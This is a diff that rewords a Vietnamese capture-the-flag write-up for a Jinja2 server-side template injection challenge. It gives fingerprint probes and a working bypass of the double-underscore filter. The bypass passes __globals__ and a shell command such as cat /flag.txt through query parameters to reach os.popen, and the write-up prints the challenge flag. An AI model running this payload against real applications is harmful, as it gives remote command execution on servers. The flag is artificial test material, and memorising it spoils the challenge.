@@ -4,49 +4,49 @@
 
 ## Đề bài
 
-Hệ thống mục tiêu là Certmarq, một nền tảng dịch vụ cấp phát chứng chỉ khóa học. Quy trình của nó: nhà phát hành chỉ việc thiết kế mẫu vỏn vẹn một lần, nền tảng sẽ tự động trích xuất và nhồi (merge) thông tin của từng học viên vào mẫu đó, rồi phun ra chứng chỉ hàng loạt. 
-Chỗ hiểm yếu của đề bài nằm ở tính năng: trình thiết kế (designer) cho phép nhà phát hành xem trước (preview) bản chứng chỉ bằng cách kết xuất (render) trực tiếp trên máy chủ. Lời nhận xét "nó quá dễ dãi tin tưởng vào người thiết kế hơn mức cho phép" chính là tiếng chuông báo tử cho máy chủ này.
+Hệ thống mục tiêu là Certmarq, nền tảng dịch vụ cấp phát chứng chỉ khóa học. Quy trình hoạt động: nhà phát hành thiết kế mẫu cấu trúc chung, nền tảng tự động kết hợp (merge) thông tin học viên vào mẫu và tạo ra chứng chỉ. 
+Điểm yếu của hệ thống nằm ở tính năng: trình thiết kế (designer) cho phép nhà phát hành xem trước (preview) bản chứng chỉ bằng cách kết xuất (render) trực tiếp trên máy chủ. Đặc tính không giới hạn quyền của người thiết kế này là dấu hiệu cho thấy có lỗi trong quy trình.
 
 ## Phân tích ban đầu
 
-Người chơi có thể lách vào tạo tài khoản nhà phát hành (issuer) một cách nhẹ nhàng mà không bị hệ thống đòi hỏi xác thực email, đâm thẳng vào màn hình chức năng `/designer`. Trên giao diện, hệ thống cảnh cáo: 
-*"mọi bản mẫu (template) đều phải chui qua máy quét kiểm duyệt nội dung (content filter) trước khi được kết xuất"* - Đoạn này như một lời thách thức, nói huỵch toẹt ra là tác giả biết thừa lỗ hổng SSTI (Server-Side Template Injection) đang tồn tại và đã cắm bộ lọc để ngăn chặn nó.
+Người dùng có thể truy cập hệ thống để tạo tài khoản nhà phát hành (issuer) dễ dàng mà không yêu cầu xác thực email, cho phép vào thẳng trang quản lý `/designer`. Trên giao diện, hệ thống hiển thị thông báo: 
+*"mọi bản mẫu (template) đều phải qua quy trình kiểm duyệt (content filter) trước khi kết xuất"* - Cảnh báo này cho thấy lỗ hổng SSTI (Server-Side Template Injection) đã được nhận dạng và thiết lập bộ lọc (filter) phòng chống.
 
-Điểm nhận chìm (sink) của dữ liệu nằm ở cổng `POST /designer/preview`, chỉ ngốn duy nhất một trường dữ liệu là `body`. Dùng các loại đạn thăm dò (fingerprint) bắn phá hệ thống để nhận diện động cơ:
+Điểm tiếp nhận (sink) của quá trình nằm ở cổng `POST /designer/preview`, chỉ yêu cầu trường dữ liệu `body`. Sử dụng chuỗi kiểm tra (fingerprint) để xác định cấu trúc nền tảng:
 
-| Đạn thăm dò (Probe) | Phản hồi |
+| Chuỗi kiểm tra (Probe) | Phản hồi |
 | --- | --- |
-| `{{7*7}}` | Đẻ ra `49` |
-| `{{7*'7'}}` | Đẻ ra `7777777` -> Đích thị là động cơ Jinja2 (Nếu là Twig thì nó sẽ nhả `77`). |
+| `{{7*7}}` | Trả về `49` |
+| `{{7*'7'}}` | Trả về `7777777` -> Xác nhận nền tảng Jinja2 (Với Twig sẽ trả về `77`). |
 | `${7*7}` | Giữ nguyên văn -> Loại trừ nhánh Twig/EJS. |
-| `{{ ''\|class }}` | Dội mã lỗi `TemplateAssertionError` -> 100% cú pháp bộ lọc của Jinja. |
-| `{{config.items()}}` | Phun sạch sẽ toàn bộ mảng cấu hình config của thư viện Flask. |
-| `{{ ''.__class__ }}` | Chặn đứng với thông báo: *the pattern "__" is not allowed* |
+| `{{ ''\|class }}` | Trả về lỗi `TemplateAssertionError` -> Chính xác cú pháp bộ lọc Jinja. |
+| `{{config.items()}}` | Hiển thị toàn bộ cấu trúc config của Flask. |
+| `{{ ''.__class__ }}` | Ngăn chặn với thông báo: *the pattern "__" is not allowed* |
 
-Đánh giá tài sản thu hoạch được: Lỗ hổng chết người của cái bộ lọc ngớ ngẩn này là nó chỉ săm soi chăm chăm vào duy nhất một chuỗi văn bản là `__` (hai dấu gạch dưới - dunder). Mọi chuỗi rác (literal) chứa cụm dunder nhét trong template đều bị chém đứt, nhưng mắt nó lại hoàn toàn mù loà, không hề nhìn vào phần biến số truyền tải qua đuôi url (query string).
+Đánh giá thông tin thu thập: Lỗ hổng của bộ lọc đơn giản là hệ thống chỉ kiểm tra một chuỗi văn bản là `__` (hai dấu gạch dưới - dunder). Mọi chuỗi (literal) chứa cụm dunder bên trong template sẽ bị hệ thống loại bỏ, nhưng bộ lọc không kiểm tra phần biến số truyền qua tham số url (query string).
 
-## Chuỗi khai thác
+## Quá trình khai thác
 
-Ý đồ tác chiến: Thiết kế một khối template trong sạch tì vết, cấm tuyệt đối mọi dấu vết của cụm `__`. Bù lại, cái tên thật sự của cụm dunder cần tìm sẽ được ta phù phép, nhập lậu từ bên ngoài thông qua ngõ cửa sau là biến `request.args`:
+Phương pháp xử lý: Thiết lập khối template không chứa mã cấm `__`. Thay vào đó, chuỗi dunder cần thiết sẽ được truyền vào từ bên ngoài thông qua tham số `request.args`:
 
 ```jinja
 {{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
 ```
 
-Giải phẫu cú pháp:
-- Biến `lipsum` là một khối dữ liệu toàn cục (global) được nhúng sẵn mặc định bên trong lòng Jinja2. Bằng cách gọi `attr(request.args.g)` kèm mồi `g=__globals__` vứt trên thanh query, ta đã thành công thò tay bốc trọn bộ từ điển biến toàn cục của module hệ thống `jinja2.utils`. Và trong mớ hỗn độn đó, bộ thư viện quyền lực `os` vốn đã được nạp (import) sẵn để đợi ta xài.
-- Dòng lệnh `['os'].popen(request.args.c).read()` có chức năng mượn danh nghĩa OS để kích nổ luồng lệnh hệ thống (thông qua biến `c`), và hốt trọn toàn bộ kết quả ném thẳng lên màn hình giao diện xem trước (preview).
-- Khối thân (body) của mã template đem gửi không hề tàng trữ cụm mã cấm `__`, giúp nó qua mặt bộ lọc kiểm duyệt một cách kiêu hãnh. Cụm từ nhạy cảm `__globals__` được nhét an toàn ở thanh URL (query string), nằm ngoài tầm quét radar của bộ lọc.
+Phân tích cú pháp:
+- Biến `lipsum` là một hằng số toàn cục (global) được nhúng mặc định bên trong Jinja2. Việc gọi `attr(request.args.g)` kèm tham số `g=__globals__` ở chuỗi truy vấn giúp truy xuất trực tiếp từ điển biến toàn cục của module `jinja2.utils`. Trong tập dữ liệu này, thư viện `os` quan trọng đã được khai báo (import) sẵn.
+- Cấu trúc lệnh `['os'].popen(request.args.c).read()` có chức năng thực thi mã hệ thống (thông qua biến `c`), và lấy kết quả trả về hiển thị trên màn hình xem trước (preview).
+- Cấu trúc template nội bộ không chứa cụm mã cấm `__`, dễ dàng vượt qua bộ lọc. Cụm từ nhạy cảm `__globals__` được cấu hình trên thanh URL (query string), nằm ngoài phạm vi kiểm tra của bộ lọc.
 
-Bài kiểm tra nhân phẩm bằng lệnh `c=id`: Trả về `uid=33(www-data)`. Sau khi đã êm xuôi, thay đạn `c=cat /flag.txt` để cuỗm cờ. 
-Nếu mổ xẻ file `/entrypoint.sh` đính kèm, chính miệng tác giả cũng đã thừa nhận: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain reads /flag.txt"* (Lỗ hổng SSTI trực diện không bọc cát... một chuỗi RCE mẫu mực của Jinja2 đã moi được file /flag.txt).
+Kiểm tra lệnh cơ sở với `c=id`: Hệ thống trả về `uid=33(www-data)`. Sau khi cấu hình thành công, thiết lập tham số `c=cat /flag.txt` để lấy cờ. 
+Theo nội dung file `/entrypoint.sh` được đính kèm, tác giả mô tả: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain reads /flag.txt"* (Lỗ hổng SSTI không được cô lập... chuỗi lệnh RCE cơ bản của Jinja2 đã truy cập được file /flag.txt).
 
-Khối payload thần thánh trọn vẹn và cách bọc nó bằng mã Javascript `fetch()` được cất giữ kỹ trong tệp `analysis/payload.md`.
+Cấu trúc payload hoàn chỉnh và định dạng qua khối mã Javascript `fetch()` được tài liệu hóa trong thư mục `analysis/payload.md`.
 
 ## Flag
 ```text
 WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}
 ```
 
-Lời dặn dò: Bạn không thể tìm thấy file `exploit.py` nào để chạy lại thao tác này. Đoạn mã script dùng thư viện `requests` từng được cày cuốc viết ra, nhưng đáng tiếc chưa từng trải qua một lần kích hoạt thành công: Khi người thử nghiệm chạy lại, môi trường (instance) đã bị máy chủ dập tắt (Nền tảng WebVerse có luật thép chỉ cho chạy duy nhất một môi trường tại một thời điểm), và định danh gốc của các trường thông tin trong form đăng ký vẫn chưa kịp được ghi chép xác nhận. 
-Sản phẩm cuối cùng được bảo chứng chính là đoạn chuỗi payload kèm theo khối mã nhúng JS nằm trong tệp `analysis/payload.md`. Mã này được thiết kế để nã trực tiếp trên giao diện console của cái tab chứa chính instance đó.
+Lưu ý: Không cung cấp tệp `exploit.py` để tự động hóa. Mã script sử dụng thư viện `requests` đã được thiết kế, tuy nhiên chưa được xác nhận tính ổn định: Khi chạy lệnh, môi trường (instance) đã bị máy chủ vô hiệu hóa (WebVerse quy định chỉ một instance hoạt động duy nhất), và định danh các tham số form chưa được đối soát. 
+Tài liệu cung cấp chuỗi payload chuẩn và cấu trúc JS nhúng trong `analysis/payload.md`. Lệnh này được thiết kế để thực thi trực tiếp trên giao diện console của môi trường duyệt web hiện tại.
